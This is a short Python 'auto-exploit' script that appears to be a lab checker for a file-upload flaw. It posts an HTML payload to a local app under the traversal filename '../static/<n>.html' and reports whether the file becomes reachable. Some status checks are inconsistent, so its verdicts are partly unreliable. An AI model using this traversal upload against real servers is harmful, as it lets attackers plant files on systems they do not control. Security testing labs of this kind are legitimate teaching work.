'''
    auto-exploit
    vulnerability: File Upload
    payload file: t_upload.html
'''
import requests
import os
import random
import time

URL = 'http://127.0.0.1:5000/'

def attack():
	filename = str(random.randint(1, 1000)) + '.html'
	#file_location = os.path.join(os.getcwd(), 'lab/attack/t_upload.html') # in docker
	file_location = os.path.join(os.getcwd(), './attack/t_upload.html') # in docker

	files = {'file': ('../static/'+filename, open(file_location,'r'), 'text/html')}

	print(filename)
	r_post = requests.post(URL, files=files)
	if r_post.status_code == 200:
		# check if the vulnerable file exist
		time.sleep(0.5)
		r_get = requests.get(URL + ('static/'+filename))
		if r_get.status_code == 200:
			# the app is vulnerable
			return (True, "The app is vulnerable")
		elif r_post.status_code == 404:
			return (False, "You are in good hands")
		else:
			return (False, "You are in good hands")
	else:
		# upload feature not exist or something else
		return (True, "The app is vulnerable")


if __name__ == '__main__':
	res = attack()
	print(res)